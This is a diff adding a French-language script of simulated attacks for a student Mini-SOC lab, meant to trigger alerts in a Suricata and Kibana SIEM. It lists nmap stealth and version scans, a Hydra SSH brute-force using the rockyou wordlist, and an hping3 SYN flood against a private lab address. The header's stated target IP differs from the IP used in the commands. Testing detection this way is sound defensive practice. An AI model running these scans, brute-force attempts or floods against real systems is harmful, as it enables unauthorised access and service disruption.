@@ -1,0 +1,42 @@
+# ==========================================================
+# SCÉNARIOS D'ATTAQUES SIMULÉES (KALI LINUX)
+# Projet : Mini-SOC / Florine MADAN
+# Cible : Ubuntu Server (192.168.10.1)
+# ==========================================================
+
+# 1. RECONNAISSANCE & SCAN RÉSEAU (Nmap)
+# Objectif : Identifier les ports ouverts et les services
+# ----------------------------------------------------------
+
+# Scan SYN furtif (Stealth Scan)
+nmap -sS 192.168.10.2
+
+# Scan complet avec détection d'OS et de versions de services
+nmap -A -T4 192.168.10.2
+
+# Scan spécifique sur le port SSH
+nmap -p 22 192.168.10.2
+
+
+# 2. ATTAQUE PAR BRUTE-FORCE (Hydra)
+# Objectif : Tenter de forcer l'accès SSH avec un dictionnaire
+# ----------------------------------------------------------
+
+# Tentative de brute-force sur l'utilisateur "user"
+# -l : utilisateur cible / -P : chemin vers la liste de mots de passe
+hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.2
+
+
+# 3. DÉNI DE SERVICE LÉGER / TEST DE CHARGE (Hping3)
+# Objectif : Vérifier la montée en charge des alertes sur le SIEM
+# ----------------------------------------------------------
+
+# Inondation de paquets SYN sur le port 80
+sudo hping3 -S --flood -V -p 80 192.168.10.2
+
+# ==========================================================
+# RÉSULTATS ATTENDUS DANS LE SIEM :
+# - Signature Suricata : "ET SCAN Potential SSH Scan"
+# - Signature Suricata : "ET SCAN Nmap SQL Scan"
+# - Augmentation du volume des logs dans le dashboard Kibana
+# ==========================================================
